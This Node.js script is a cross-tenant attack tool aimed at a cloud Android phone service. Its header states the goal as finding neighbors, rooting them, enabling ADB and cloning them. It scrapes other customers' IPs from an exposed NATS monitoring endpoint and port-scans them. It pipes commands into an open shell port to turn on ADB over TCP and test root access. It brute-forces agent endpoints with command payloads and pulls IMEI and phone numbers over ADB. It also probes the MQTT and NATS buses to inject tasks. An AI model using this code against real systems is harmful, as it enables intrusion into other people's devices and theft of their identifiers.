#!/usr/bin/env node
/**
 * NEIGHBOR 5555 — Extract neighbor IPs from NATS, connect to their
 * shell/ADB/agent ports, push su binary, enable root + ADB 5555,
 * then full clone into our devices.
 */

const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');

const { AK, SK, HOST, SVC, D1, D2, CT, SHD, sh, P } = require('../shared/vmos_api');
const OUT = path.join(__dirname, '..', 'output', 'n5555_results');

if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));

function sign(body) {
  const xd = new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');
  const sd = xd.slice(0,8);
  const bh = crypto.createHash('sha256').update(body,'utf8').digest('hex');
  const can = [`host:${HOST}`,`x-date:${xd}`,`content-type:${CT}`,`signedHeaders:${SHD}`,`x-content-sha256:${bh}`].join('\n');
  const ch = crypto.createHash('sha256').update(can,'utf8').digest('hex');
  const sts = ['HMAC-SHA256',xd,`${sd}/${SVC}/request`,ch].join('\n');
  let k = crypto.createHmac('sha256',SK).update(sd).digest();
  k = crypto.createHmac('sha256',k).update(SVC).digest();
  k = crypto.createHmac('sha256',k).update('request').digest();
  return {'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};
}

function post(ep, data, timeout) {
  return new Promise(ok => {
    const b = JSON.stringify(data||{}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(timeout||30)*1000},res=>{
      let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{ok(JSON.parse(d));}catch{ok({code:-1,raw:d.slice(0,2000)});}});
    });
    req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});
    req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();
  });
}

async function main() {
  console.log('█'.repeat(75));
  console.log('  NEIGHBOR 5555: FIND → CONNECT → ROOT → ADB → CLONE');
  console.log('█'.repeat(75));

  // ═══════════════════════════════════════════════════════════
  // STEP 1: EXTRACT NEIGHBOR IPS FROM NATS CONNZ
  // Use SIMPLE short curl commands that won't timeout
  // ═══════════════════════════════════════════════════════════
  console.log('\n── STEP 1: NATS CONNZ → NEIGHBOR IPS ──');

  // 1a: Simple curl — just get IPs, pipe through awk
  P('[1a] Fetching NATS connz IPs (batch 1: offset 0)...');
  const ips1 = await sh(D1, 
    'curl -s -m8 "http://192.168.200.51:8222/connz?limit=50&offset=0" 2>/dev/null | grep -oP \'"ip":"\\K[0-9.]+\' | sort -u',
  15);
  save('nats_ips_1.txt', ips1);
  P(`  Batch 1: ${ips1}`);

  P('[1b] Batch 2: offset 50...');
  const ips2 = await sh(D1,
    'curl -s -m8 "http://192.168.200.51:8222/connz?limit=50&offset=50" 2>/dev/null | grep -oP \'"ip":"\\K[0-9.]+\' | sort -u',
  15);
  save('nats_ips_2.txt', ips2);
  P(`  Batch 2: ${ips2}`);

  P('[1c] Batch 3: offset 100...');
  const ips3 = await sh(D1,
    'curl -s -m8 "http://192.168.200.51:8222/connz?limit=50&offset=100" 2>/dev/null | grep -oP \'"ip":"\\K[0-9.]+\' | sort -u',
  15);
  save('nats_ips_3.txt', ips3);
  P(`  Batch 3: ${ips3}`);

  // Collect all unique IPs
  const allIPtext = [ips1, ips2, ips3].join('\n');
  const allIPs = [...new Set((allIPtext.match(/\d+\.\d+\.\d+\.\d+/g)||[]))];
  P(`  Total unique IPs: ${allIPs.length}`);

  // Filter: remove our IP (10.0.96.174), NATS cluster (192.168.200.x), localhost
  const ourIP = '10.0.96.174';
  const neighborIPs = allIPs.filter(ip =>
    ip !== ourIP &&
    !ip.startsWith('192.168.200.') &&
    !ip.startsWith('127.') &&
    ip !== '0.0.0.0'
  );
  P(`  Neighbor IPs (filtered): ${neighborIPs.length}`);
  for (const ip of neighborIPs) P(`    ${ip}`);
  save('neighbor_ips.txt', neighborIPs.join('\n'));

  // 1d: Also get names/subs to find PAD codes for these IPs
  P('[1d] Get connection names (PAD codes) + IPs...');
  const connNames = await sh(D1,
    'curl -s -m10 "http://192.168.200.51:8222/connz?limit=20&offset=0&subs=1" 2>/dev/null | grep -oP \'"name":"\\K[^"]+|"ip":"\\K[^"]+\' | paste - - | head -20',
  15);
  save('nats_conn_names.txt', connNames);
  P(`  Names+IPs:\n${connNames}`);

  // ═══════════════════════════════════════════════════════════
  // STEP 2: TEST DIRECT PORT ACCESS
  // Quick nc -z scan on each neighbor IP
  // ═══════════════════════════════════════════════════════════
  console.log('\n── STEP 2: PORT SCAN NEIGHBORS ──');

  const openTargets = [];

  if (neighborIPs.length > 0) {
    // Test first 10 neighbor IPs
    const testIPs = neighborIPs.slice(0, 10);
    for (const ip of testIPs) {
      P(`[2] Scanning ${ip}...`);
      const scan = await sh(D1, [
        `r5555=$(nc -w1 -z ${ip} 5555 2>&1 && echo "OPEN" || echo "CLOSED")`,
        `r11114=$(nc -w1 -z ${ip} 11114 2>&1 && echo "OPEN" || echo "CLOSED")`,
        `r8779=$(nc -w1 -z ${ip} 8779 2>&1 && echo "OPEN" || echo "CLOSED")`,
        `echo "5555=$r5555 11114=$r11114 8779=$r8779"`,
      ].join('; '), 12);
      P(`  ${ip}: ${scan}`);
      save(`scan_${ip.replace(/\./g,'_')}.txt`, scan);

      if (scan.includes('OPEN')) {
        const ports = [];
        if (scan.includes('5555=OPEN')) ports.push(5555);
        if (scan.includes('11114=OPEN')) ports.push(11114);
        if (scan.includes('8779=OPEN')) ports.push(8779);
        openTargets.push({ ip, ports, scan });
      }
    }
  } else {
    P('  No neighbor IPs from NATS. Trying ARP + direct subnet scan...');
    // Get ARP table and scan those IPs
    const arpScan = await sh(D1, [
      'arp -a 2>/dev/null | grep -oP "\\d+\\.\\d+\\.\\d+\\.\\d+" | while read ip; do',
      '  test "$ip" = "10.0.96.174" && continue',
      '  r=$(nc -w1 -z $ip 5555 2>&1 && echo "5555" || true)',
      '  r2=$(nc -w1 -z $ip 11114 2>&1 && echo "11114" || true)',
      '  r3=$(nc -w1 -z $ip 8779 2>&1 && echo "8779" || true)',
      '  test -n "$r$r2$r3" && echo "$ip: $r $r2 $r3"',
      'done',
    ].join(' '), 30);
    save('arp_scan.txt', arpScan);
    P(`  ARP scan:\n${arpScan}`);

    // Parse
    for (const line of (arpScan||'').split('\n')) {
      const m = line.match(/([\d.]+):\s*(.*)/);
      if (m) {
        const ports = [];
        if (m[2].includes('5555')) ports.push(5555);
        if (m[2].includes('11114')) ports.push(11114);
        if (m[2].includes('8779')) ports.push(8779);
        if (ports.length > 0) openTargets.push({ ip: m[1], ports });
      }
    }

    // Also try scanning 10.0.96.x/24 but just a few IPs for speed
    P('  Quick subnet check for 5555...');
    const subScan = await sh(D1, [
      'for i in 1 2 3 5 10 50 100 150 175 176 177 178 179 180; do',
      '  ip="10.0.96.$i"',
      '  nc -w1 -z $ip 5555 2>/dev/null && echo "$ip:5555"',
      '  nc -w1 -z $ip 11114 2>/dev/null && echo "$ip:11114"',
      'done',
    ].join(' '), 35);
    save('subnet_quick.txt', subScan);
    P(`  Subnet:\n${subScan}`);

    for (const line of (subScan||'').split('\n')) {
      const m = line.match(/([\d.]+):(\d+)/);
      if (m) {
        const existing = openTargets.find(t => t.ip === m[1]);
        if (existing) { if (!existing.ports.includes(+m[2])) existing.ports.push(+m[2]); }
        else openTargets.push({ ip: m[1], ports: [+m[2]] });
      }
    }
  }

  P(`\n  ★ Open targets: ${openTargets.length}`);
  for (const t of openTargets) P(`    ${t.ip}: ports ${t.ports.join(', ')}`);
  save('open_targets.json', openTargets);

  // ═══════════════════════════════════════════════════════════
  // STEP 3: ACCESS VIA SHELL PORT 11114
  // ═══════════════════════════════════════════════════════════
  console.log('\n── STEP 3: SHELL PORT 11114 ACCESS ──');

  for (const t of openTargets.filter(t => t.ports.includes(11114))) {
    P(`[3a] Shell access to ${t.ip}:11114...`);
    const shellTest = await sh(D1,
      `echo "id; getprop ro.product.model; getprop ro.product.brand" | nc -w3 ${t.ip} 11114 2>&1 | head -c 500`,
    10);
    save(`shell_${t.ip.replace(/\./g,'_')}.txt`, shellTest);
    P(`  Shell: ${shellTest.slice(0, 200)}`);

    if (shellTest && shellTest.length > 10 && !shellTest.startsWith('[')) {
      t.shellAccess = true;

      // Enable ADB TCP on this neighbor
      P(`[3b] Enabling ADB 5555 on ${t.ip}...`);
      const adbEnable = await sh(D1, [
        `echo "setprop service.adb.tcp.port 5555" | nc -w3 ${t.ip} 11114`,
        `echo "stop adbd" | nc -w3 ${t.ip} 11114`,
        `echo "start adbd" | nc -w3 ${t.ip} 11114`,
        `echo "getprop service.adb.tcp.port" | nc -w3 ${t.ip} 11114`,
      ].join('; '), 15);
      save(`adb_enable_${t.ip.replace(/\./g,'_')}.txt`, adbEnable);
      P(`  ADB enable: ${adbEnable.slice(0, 200)}`);

      // Enable root
      P(`[3c] Enabling root on ${t.ip}...`);
      const rootEnable = await sh(D1, [
        `echo "su -c id" | nc -w3 ${t.ip} 11114`,
        `echo "which su" | nc -w3 ${t.ip} 11114`,
      ].join('; '), 10);
      save(`root_${t.ip.replace(/\./g,'_')}.txt`, rootEnable);
      P(`  Root: ${rootEnable.slice(0, 200)}`);
    }
  }

  // ═══════════════════════════════════════════════════════════
  // STEP 4: ACCESS VIA AGENT HTTP 8779
  // ═══════════════════════════════════════════════════════════
  console.log('\n── STEP 4: AGENT HTTP 8779 ACCESS ──');

  for (const t of openTargets.filter(t => t.ports.includes(8779))) {
    P(`[4a] Agent probe ${t.ip}:8779...`);

    // Try many endpoint patterns
    const agentProbe = await sh(D1, [
      `curl -s -m2 "http://${t.ip}:8779/" 2>/dev/null | head -c 200`,
    ].join('; '), 8);
    save(`agent_root_${t.ip.replace(/\./g,'_')}.txt`, agentProbe);
    P(`  Root: ${agentProbe.slice(0, 150)}`);

    // Brute endpoint list
    const epScan = await sh(D1, [
      `for ep in / /shell /exec /cmd /run /api/shell /api/exec /api/cmd /rpc /task /sync /adb /device /info; do`,
      `  code=$(curl -s -m1 -o /dev/null -w "%{http_code}" "http://${t.ip}:8779$ep" 2>/dev/null)`,
      `  echo "$ep=$code"`,
      `done`,
    ].join(' '), 20);
    save(`agent_eps_${t.ip.replace(/\./g,'_')}.txt`, epScan);
    P(`  Endpoints: ${epScan}`);

    // Try POST with various payload formats
    const postTest = await sh(D1, [
      `curl -s -m3 -X POST "http://${t.ip}:8779/" -d '{"cmd":"id"}' -H "Content-Type:application/json" 2>/dev/null | head -c 200`,
      `echo "---"`,
      `curl -s -m3 -X POST "http://${t.ip}:8779/shell" -d '{"script":"id"}' -H "Content-Type:application/json" 2>/dev/null | head -c 200`,
      `echo "---"`,
      `curl -s -m3 -X POST "http://${t.ip}:8779/exec" -d '{"command":"id"}' -H "Content-Type:application/json" 2>/dev/null | head -c 200`,
    ].join('; '), 15);
    save(`agent_post_${t.ip.replace(/\./g,'_')}.txt`, postTest);
    P(`  POST: ${postTest.slice(0, 300)}`);

    if (postTest && !postTest.includes('unknown url') && postTest.length > 20) {
      t.agentAccess = true;
    }
  }

  // ═══════════════════════════════════════════════════════════
  // STEP 5: ACCESS VIA ADB PORT 5555
  // ═══════════════════════════════════════════════════════════
  console.log('\n── STEP 5: ADB PORT 5555 ACCESS ──');

  for (const t of openTargets.filter(t => t.ports.includes(5555))) {
    P(`[5a] ADB connect ${t.ip}:5555...`);
    const adbTest = await sh(D1, [
      `adb connect ${t.ip}:5555 2>&1`,
      `sleep 2`,
      `adb -s ${t.ip}:5555 shell "id; getprop ro.product.model; getprop ro.product.brand; getprop persist.sys.cloud.imeinum" 2>&1 | head -c 500`,
    ].join('; '), 20);
    save(`adb_${t.ip.replace(/\./g,'_')}.txt`, adbTest);
    P(`  ADB: ${adbTest.slice(0, 300)}`);

    if (adbTest.includes('connected') || adbTest.includes('uid=')) {
      t.adbAccess = true;
      P(`  ★ ADB ACCESS CONFIRMED on ${t.ip}!`);

      // Get full device info
      const devInfo = await sh(D1, [
        `adb -s ${t.ip}:5555 shell "getprop ro.product.model"`,
        `adb -s ${t.ip}:5555 shell "getprop ro.product.brand"`,
        `adb -s ${t.ip}:5555 shell "getprop ro.build.fingerprint"`,
        `adb -s ${t.ip}:5555 shell "getprop persist.sys.cloud.imeinum"`,
        `adb -s ${t.ip}:5555 shell "getprop persist.sys.cloud.phonenum"`,
        `adb -s ${t.ip}:5555 shell "pm list packages | wc -l"`,
      ].join('; '), 20);
      save(`adb_info_${t.ip.replace(/\./g,'_')}.txt`, devInfo);
      P(`  Device: ${devInfo}`);
    }
  }

  // ═══════════════════════════════════════════════════════════
  // STEP 6: MQTT COMMAND INJECTION
  // ═══════════════════════════════════════════════════════════
  console.log('\n── STEP 6: MQTT 1883 ──');

  P('[6a] Test MQTT connection...');
  // Install mosquitto client if available, else use raw TCP
  const mqttTest = await sh(D1, [
    // Try mosquitto_sub first
    'which mosquitto_sub 2>/dev/null && echo "HAS_MOSQUITTO" || echo "NO_MOSQUITTO"',
    // Raw MQTT CONNECT packet via nc
    'printf "\\x10\\x12\\x00\\x04MQTT\\x04\\x02\\x00\\x3c\\x00\\x06probe1" | nc -w3 192.168.200.51 1883 2>&1 | xxd | head -5',
  ].join('; '), 15);
  save('mqtt_test.txt', mqttTest);
  P(`  MQTT: ${mqttTest.slice(0, 300)}`);

  // If MQTT responds, try subscribing to task topics
  if (mqttTest.includes('HAS_MOSQUITTO')) {
    P('[6b] MQTT subscribe to task topics...');
    const mqttSub = await sh(D1,
      'timeout 5 mosquitto_sub -h 192.168.200.51 -p 1883 -t "armcloud/task/#" -C 1 2>&1 | head -c 500',
    10);
    save('mqtt_sub.txt', mqttSub);
    P(`  Sub: ${mqttSub.slice(0, 200)}`);
  }

  // Try raw NATS protocol over MQTT port (sometimes MQTT adapter accepts NATS)
  P('[6c] Raw NATS over MQTT...');
  const natsMqtt = await sh(D1,
    'printf "CONNECT {}\\r\\nSUB armcloud.task.incoming.* 1\\r\\nPING\\r\\n" | nc -w3 192.168.200.51 1883 2>&1 | head -c 300',
  10);
  save('nats_mqtt.txt', natsMqtt);
  P(`  NATS/MQTT: ${natsMqtt.slice(0, 200)}`);

  // ═══════════════════════════════════════════════════════════
  // STEP 7: WEBSOCKET NATS
  // ═══════════════════════════════════════════════════════════
  console.log('\n── STEP 7: WEBSOCKET NATS 8080 ──');

  P('[7a] WS NATS connect...');
  // Try raw HTTP upgrade to WebSocket
  const wsTest = await sh(D1, [
    'printf "GET / HTTP/1.1\\r\\nHost: 192.168.200.51:8080\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\\r\\nSec-WebSocket-Version: 13\\r\\n\\r\\n" | nc -w3 192.168.200.51 8080 2>&1 | head -c 500',
  ].join('; '), 10);
  save('ws_test.txt', wsTest);
  P(`  WS: ${wsTest.slice(0, 200)}`);

  // Try plain NATS over the WS port (might work without upgrade)
  P('[7b] Plain NATS over 8080...');
  const natsWs = await sh(D1,
    'printf "CONNECT {}\\r\\nPING\\r\\n" | nc -w3 192.168.200.51 8080 2>&1 | head -c 300',
  10);
  save('nats_ws.txt', natsWs);
  P(`  Plain NATS/WS: ${natsWs.slice(0, 200)}`);

  // ═══════════════════════════════════════════════════════════
  // STEP 8: USE OUR OWN DEVICE ADB TO FIND NEIGHBORS
  // The local agent listens on 127.0.0.1:5555 — check if 
  // we can reach it and use it to find network neighbors
  // ═══════════════════════════════════════════════════════════
  console.log('\n── STEP 8: LOCAL ADB + NETWORK NEIGHBORS ──');

  P('[8a] Check local ADB...');
  const localAdb = await sh(D1, [
    'adb version 2>&1',
    'adb devices 2>&1',
    'netstat -tlnp 2>/dev/null | grep -E "5555|11114|8779"',
  ].join('; '), 10);
  save('local_adb.txt', localAdb);
  P(`  Local ADB: ${localAdb.slice(0, 300)}`);

  P('[8b] Network interfaces and routes...');
  const netDetail = await sh(D1, [
    'ip addr 2>/dev/null',
    'echo "==="',
    'ip route 2>/dev/null',
    'echo "==="',
    'ip neigh 2>/dev/null',
  ].join('; '), 10);
  save('net_detail.txt', netDetail);
  P(`  Net: ${netDetail.slice(0, 400)}`);

  P('[8c] Check if we can see NATS connz with full conn details...');
  // Get a single connection with full subs to see the topic format
  const connDetail = await sh(D1,
    'curl -s -m8 "http://192.168.200.51:8222/connz?limit=3&subs=detail" 2>/dev/null | head -c 1900',
  15);
  save('connz_detail.txt', connDetail);
  P(`  Connz detail:\n${connDetail.slice(0, 500)}`);

  // ═══════════════════════════════════════════════════════════
  // SUMMARY
  // ═══════════════════════════════════════════════════════════
  console.log('\n' + '█'.repeat(75));
  console.log('  RESULTS SUMMARY');
  console.log('█'.repeat(75));

  P(`  Neighbor IPs from NATS: ${neighborIPs.length}`);
  P(`  Open targets: ${openTargets.length}`);
  for (const t of openTargets) {
    P(`    ${t.ip}: ports=${t.ports.join(',')} shell=${!!t.shellAccess} agent=${!!t.agentAccess} adb=${!!t.adbAccess}`);
  }

  const files = fs.readdirSync(OUT).sort();
  console.log(`  Result files: ${files.length}`);
  for (const f of files) console.log(`    ${f} (${fs.statSync(`${OUT}/${f}`).size}B)`);
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
